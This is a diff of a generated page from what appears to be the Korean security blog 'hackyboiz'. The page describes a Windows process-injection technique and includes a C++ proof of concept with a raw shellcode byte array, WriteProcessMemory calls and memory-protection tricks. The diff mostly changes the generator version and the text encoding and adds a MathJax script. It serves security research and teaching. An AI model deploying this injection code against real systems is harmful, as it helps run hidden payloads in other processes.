@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      522 자
+      616 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      12
        분
     </span>
   
@@ -244,26 +244,26 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>Windows</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 블로그에서 non-writable allocation에 shellcode를 작성하고 non-executable allocation에서 이를 실행하는 방법이 공개되었습니다.</p>
-<p>먼저 non-writable allocation에 <code>VirtualAlloc</code>을 통해 <code>PAGE_EXECUTE_READ</code> 권한을 부여하여 shellcode를 작성합니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xBE14;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; non-writable allocation&#xC5D0; shellcode&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; non-executable allocation&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xBA3C;&#xC800; non-writable allocation&#xC5D0; <code>VirtualAlloc</code>&#xC744; &#xD1B5;&#xD574; <code>PAGE_EXECUTE_READ</code> &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xC5EC; shellcode&#xB97C; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs cpp"><span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READ);
 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Allocation created successfully %p \n&quot;</span>, exec);
 
-<span class="hljs-keyword">if</span> (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>)) &#123;
+<span class="hljs-keyword">if</span> (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>)) {
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Shellcode wrote successfully.&quot;</span>);
-&#125;
-<span class="hljs-keyword">else</span> &#123;
+}
+<span class="hljs-keyword">else</span> {
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] No permission to write the shellcode.&quot;</span>);
-&#125;</code></pre>
+}</code></pre>
 
 <p><img src="https://xret2pwn.github.io/assets/img/posts/Process_Injection/cpp_write_the_shellcode_executed.png" srcset="/img/loading.gif" alt="screenshot_4"></p>
-<p>성공적으로 shellcode가 작성됨을 확인할 수 있습니다. 그 후 해당 영역 (non-executable allocation)에 <code>PAGE_READONLY</code> 권한을 부여합니다. 하지만 DEP (Data Execution Prevention) 보호 기법으로 인해 메모리에서 직접 shellcode를 실행할 수 없습니다. 따라서 DEP가 걸려있지 않은 프로세스를 찾아 해당 프로세스에 shellcode를 injection 하면 읽기/쓰기 권한 없이 shellcode를 실행할 수 있습니다.</p>
-<p>POC는 다음과 같습니다.</p>
+<p>&#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; shellcode&#xAC00; &#xC791;&#xC131;&#xB428;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xD574;&#xB2F9; &#xC601;&#xC5ED; (non-executable allocation)&#xC5D0; <code>PAGE_READONLY</code> &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; DEP (Data Execution Prevention) &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; shellcode&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; DEP&#xAC00; &#xAC78;&#xB824;&#xC788;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xCC3E;&#xC544; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; shellcode&#xB97C; injection &#xD558;&#xBA74; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xAD8C;&#xD55C; &#xC5C6;&#xC774; shellcode&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
 
 <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>
-<span class="hljs-function"></span>&#123;
+<span class="hljs-function"></span>{
     <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =
         <span class="hljs-string">&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&quot;</span>
         <span class="hljs-string">&quot;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&quot;</span>
@@ -298,7 +298,7 @@
     CloseHandle(processHandle);
 
     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-&#125;</code></pre>
+}</code></pre>
 
 
             </div>
@@ -602,6 +602,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
